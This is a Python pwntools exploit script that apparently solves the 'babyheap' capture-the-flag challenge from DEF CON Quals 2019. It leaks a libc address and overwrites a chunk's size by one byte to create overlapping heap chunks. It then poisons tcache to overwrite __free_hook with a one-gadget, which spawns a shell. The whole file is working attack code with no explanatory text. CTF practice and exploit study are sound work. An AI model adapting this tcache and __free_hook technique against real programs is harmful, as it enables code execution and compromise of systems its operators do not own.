from pwn import *


binname = './babyheap'
context.binary = binname
context.arch = 'amd64'
context.terminal = ['tmux', 'split-w', '-h']


elf = ELF(binname)
libc = ELF('./libc.so')


gdbscript = '''
pwn
# menu
# b *0x555555555764
b *(0x555555554000+0x0000175f)
set $array=0x555555558060
set $buf=0x7fffffffde26
'''
# io = gdb.debug([binname], aslr=False, gdbscript=gdbscript)
io = process(binname)
# io = remote('babyheap.quals2019.oooverflow.io', 5000)


def debug(func):
    def wrapper(*args, **kwargs):
        print '{}({}, {})'.format(func.__name__, str(args), str(kwargs))
        return func(*args, **kwargs)
    return wrapper


@debug
def malloc(size, content):
    io.recvuntil('Command:')
    io.recvuntil('> ')
    io.sendline('M')

    io.recvuntil('> ')
    io.sendline(str(size))

    io.recvuntil('> ')
    # io.send((content + '\n')[:size+1])
    io.send((content + '\n'))


@debug
def free(index):
    data = io.readline()
    io.recvuntil('Command:')
    io.recvuntil('> ')
    io.sendline('F')

    io.recvuntil('> ')
    io.sendline(str(index))


@debug
def show(index):
    io.recvuntil('Command:')
    io.recvuntil('> ')
    io.sendline('S')

    io.recvuntil('> ')
    io.sendline(str(index))

    data = io.recvuntil('--').rstrip('-').rstrip()
    return data


SMALL_MAX = 0xf8
LARGE_MAX = 0x178

malloc(LARGE_MAX, str(0)) # 0
malloc(SMALL_MAX, str(1)) # 1
for i in xrange(2, 10):
    malloc(LARGE_MAX, str(i))

for i in xrange(9, 1, -1):
    free(i)

malloc(SMALL_MAX, str(2)) # 2
data = show(2)
addr_libc = u64(data.ljust(8, '\x00')) - 0x1e4e32
print hex(addr_libc)


for i in xrange(3, 8):
    malloc(LARGE_MAX, str(i))

# overwrite 1's size
payload = 'A' * 0x178 + '\x81'
free(0)
malloc(LARGE_MAX, payload)

# free as 0x180 although it was originally 0x100
free(1)
# malloc overlapping chunk
malloc(LARGE_MAX, 'overlap')

# free overlapped chunk and link to tcache
free(2)

# overwrite tcache next of overlapped chunk which is linked to tcache
payload = 'B' * 0x100  + p64(addr_libc + libc.symbols['__free_hook']).rstrip('\x00')
free(1)
malloc(LARGE_MAX, payload)

# overwrite __free_hook with one gadget
addr_one_gadget = addr_libc + 0xe2383
malloc(SMALL_MAX, 'dispose')
malloc(SMALL_MAX, p64(addr_one_gadget).rstrip('\x00'))

free(2)


io.interactive()
